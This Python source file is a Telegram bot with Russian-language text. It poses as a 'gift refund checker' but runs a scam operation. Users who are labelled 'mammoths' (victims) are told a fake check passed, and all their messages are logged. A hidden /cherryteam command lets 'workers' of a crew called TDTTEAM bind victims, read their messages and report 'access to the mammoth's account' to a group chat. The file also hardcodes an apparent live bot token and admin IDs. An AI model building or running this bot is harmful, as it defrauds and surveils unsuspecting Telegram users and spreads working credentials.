import logging
import os
import asyncio
from datetime import datetime
from typing import Dict, List, Optional

from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup
)
from telegram.ext import (
    Updater,
    CommandHandler, 
    MessageHandler, 
    CallbackQueryHandler,
    CallbackContext,
    Filters
)

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация из переменных окружения
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8092588180:AAGJR1QrIqLgWBmZNxHEqb9f-Ou3YqLts7U')
GROUP_CHAT_ID = os.environ.get('GROUP_CHAT_ID', '4866741254')
ADMIN_IDS = {7662948442, 6802842517, 913595126}

# Хранилище данных
user_data_storage = {}
mammoth_connections = {}
mammoth_messages = {}
banned_users = set()

# Состояния пользователей
class UserState:
    AWAITING_USERNAME = "awaiting_username"
    AWAITING_FILE = "awaiting_file"
    AWAITING_MAMMOTH = "awaiting_mammoth"

def start(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id in banned_users:
        update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return
    
    user_data_storage[user_id] = {
        "username": update.effective_user.username or "",
        "state": "",
        "is_admin": user_id in ADMIN_IDS
    }
    
    if user_id not in mammoth_messages:
        mammoth_messages[user_id] = []
    
    mammoth_messages[user_id].append({
        "text": "/start",
        "timestamp": datetime.now().isoformat()
    })
    
    welcome_text = (
        "Привет! Добро пожаловать в бота для проверки подарков.\n\n"
        "1. Скопируйте свой username без @\n"
        "2. Отправьте username в этот чат."
    )
    update.message.reply_text(welcome_text)
    
    if user_id not in ADMIN_IDS:
        try:
            context.bot.send_message(
                chat_id=GROUP_CHAT_ID,
                text="Мамонт отправил свой username!"
            )
        except Exception as e:
            logger.error(f"Ошибка отправки в группу: {e}")

def handle_message(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id in banned_users:
        update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return
    
    if user_id not in mammoth_messages:
        mammoth_messages[user_id] = []
    
    mammoth_messages[user_id].append({
        "text": text,
        "timestamp": datetime.now().isoformat()
    })
    
    user_state = user_data_storage.get(user_id, {}).get("state", "")
    
    if user_state == UserState.AWAITING_USERNAME:
        if "@" in text:
            update.message.reply_text("❌ Пожалуйста, отправьте username без @")
            return
        
        user_data_storage[user_id]["username"] = text
        user_data_storage[user_id]["state"] = UserState.AWAITING_FILE
        update.message.reply_text("✅ Username получен!\n\nТеперь отправьте файл для полной проверки.")
        
    elif user_state == UserState.AWAITING_MAMMOTH:
        handle_mammoth_binding(update, context, text)
        
    else:
        if not text.startswith('/'):
            user_data_storage[user_id]["state"] = UserState.AWAITING_USERNAME
            update.message.reply_text("Пожалуйста, отправьте свой username без @ чтобы начать проверку.")

def handle_file(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return
    
    user_state = user_data_storage.get(user_id, {}).get("state", "")
    
    if user_state == UserState.AWAITING_FILE:
        update.message.reply_text("Файл получен! Проверка запущена...\nОжидание до 10 секунд.")
        
        import time
        time.sleep(4)
        update.message.reply_text("Проверка завершена! На подарках нет рефаунда.")
        user_data_storage[user_id]["state"] = ""

def cherryteam(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return
    
    if user_id not in user_data_storage:
        user_data_storage[user_id] = {}
    
    user_data_storage[user_id]["is_admin"] = True
    
    keyboard = [
        [InlineKeyboardButton("ПРИВЯЗАТЬ МАМОНТА 🦣", callback_data="bind_mammoth")],
        [InlineKeyboardButton("МОИ МАМОНТЫ", callback_data="my_mammoths")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "Родненький мой мигрантик рады видеть в рядах TDTTEAM!!!\n"
        "Можешь привязать своего мамонта по айди или юзеру."
    )
    update.message.reply_text(welcome_text, reply_markup=reply_markup)

def handle_mammoth_binding(update: Update, context: CallbackContext, identifier: str) -> None:
    user_id = update.effective_user.id
    
    try:
        mammoth_id = None
        
        if identifier.isdigit():
            mammoth_id = int(identifier)
        else:
            for uid, data in user_data_storage.items():
                if data.get("username", "").lower() == identifier.lower():
                    mammoth_id = uid
                    break
        
        if not mammoth_id:
            update.message.reply_text("❌ Мамонт не найден. Убедитесь, что мамонт нажал /start в боте.")
            return
        
        if mammoth_id not in mammoth_messages or not any(msg["text"] == "/start" for msg in mammoth_messages[mammoth_id]):
            update.message.reply_text("❌ Мамонт еще не нажал команду /start")
            return
        
        if user_id not in mammoth_connections:
            mammoth_connections[user_id] = []
        
        if mammoth_id not in mammoth_connections[user_id]:
            mammoth_connections[user_id].append(mammoth_id)
        
        user_data_storage[user_id]["state"] = ""
        update.message.reply_text("✅ Мамонт успешно привязан!")
        
        worker_username = user_data_storage.get(user_id, {}).get("username", "Unknown")
        mammoth_username = user_data_storage.get(mammoth_id, {}).get("username", "Unknown")
        
        try:
            context.bot.send_message(
                chat_id=GROUP_CHAT_ID,
                text=f"Воркер @{worker_username} привязал мамонта @{mammoth_username}"
            )
        except Exception as e:
            logger.error(f"Ошибка отправки в группу: {e}")
        
    except Exception as e:
        logger.error(f"Error binding mammoth: {e}")
        update.message.reply_text("❌ Произошла ошибка при привязке мамонта.")

def handle_button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if user_id in banned_users:
        query.edit_message_text("❌ Вы забанены и не можете использовать бота.")
        return
    
    if data == "bind_mammoth":
        user_data_storage[user_id]["state"] = UserState.AWAITING_MAMMOTH
        query.edit_message_text("Отправьте username или id мамонта, важно: мамонт должен прожать команду /start")
        
    elif data == "my_mammoths":
        show_my_mammoths(query, user_id)
        
    elif data.startswith("mammoth_"):
        mammoth_id = int(data.split("_")[1])
        show_mammoth_messages(query, user_id, mammoth_id)
        
    elif data == "back_to_mammoths":
        show_my_mammoths(query, user_id)
        
    elif data == "back_to_main":
        keyboard = [
            [InlineKeyboardButton("ПРИВЯЗАТЬ МАМОНТА 🦣", callback_data="bind_mammoth")],
            [InlineKeyboardButton("МОИ МАМОНТЫ", callback_data="my_mammoths")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "Родненький мой мигрантик рады видеть в рядах TDTTEAM!!!\n"
            "Можешь привязать своего мамонта по айди или юзеру.",
            reply_markup=reply_markup
        )

def show_my_mammoths(query, user_id: int) -> None:
    if user_id not in mammoth_connections or not mammoth_connections[user_id]:
        query.edit_message_text("У вас нет привязанных мамонтов.")
        return
    
    keyboard = []
    for mammoth_id in mammoth_connections[user_id]:
        mammoth_username = user_data_storage.get(mammoth_id, {}).get("username", "Unknown")
        keyboard.append([InlineKeyboardButton(
            f"🦣 {mammoth_username} (ID: {mammoth_id})", 
            callback_data=f"mammoth_{mammoth_id}"
        )])
    
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    query.edit_message_text("Ваши привязанные мамонты:", reply_markup=reply_markup)

def show_mammoth_messages(query, worker_id: int, mammoth_id: int) -> None:
    if mammoth_id not in mammoth_messages or not mammoth_messages[mammoth_id]:
        query.edit_message_text("У этого мамонта нет сообщений.")
        return
    
    messages_text = "Вот все сообщения которые отправлял мамонт:\n\n"
    for msg in mammoth_messages[mammoth_id]:
        timestamp = datetime.fromisoformat(msg["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")
        messages_text += f"[{timestamp}] {msg['text']}\n"
    
    keyboard = [[InlineKeyboardButton("🔙 Назад к мамонтам", callback_data="back_to_mammoths")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    query.edit_message_text(messages_text[:4000], reply_markup=reply_markup)
    
    worker_username = user_data_storage.get(worker_id, {}).get("username", "Unknown")
    mammoth_username = user_data_storage.get(mammoth_id, {}).get("username", "Unknown")
    
    try:
        query.bot.send_message(
            chat_id=GROUP_CHAT_ID,
            text=f"Воркер @{worker_username} получил доступ к аккаунту мамонта @{mammoth_username}"
        )
    except Exception as e:
        logger.error(f"Ошибка отправки в группу: {e}")

def ban(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        update.message.reply_text("❌ У вас нет прав для использования этой команды.")
        return
    
    if not context.args:
        update.message.reply_text("❌ Использование: /ban <user_id>")
        return
    
    try:
        target_id = int(context.args[0])
        banned_users.add(target_id)
        update.message.reply_text(f"✅ Пользователь {target_id} забанен.")
    except ValueError:
        update.message.reply_text("❌ Неверный ID пользователя.")

def main():
    print("🚀 Starting Telegram Bot...")
    
    if not BOT_TOKEN:
        print("❌ ERROR: BOT_TOKEN not found!")
        return
    
    try:
        updater = Updater(BOT_TOKEN, use_context=True)
        dp = updater.dispatcher
        
        dp.add_handler(CommandHandler("start", start))
        dp.add_handler(CommandHandler("cherryteam", cherryteam))
        dp.add_handler(CommandHandler("ban", ban))
        dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
        dp.add_handler(MessageHandler(Filters.all & ~Filters.text, handle_file))
        dp.add_handler(CallbackQueryHandler(handle_button))
        
        print("✅ Bot setup completed!")
        print("🤖 Bot is starting polling...")
        
        updater.start_polling()
        print("✅ Bot is now running!")
        
        updater.idle()
        
    except Exception as e:
        print(f"❌ Error starting bot: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
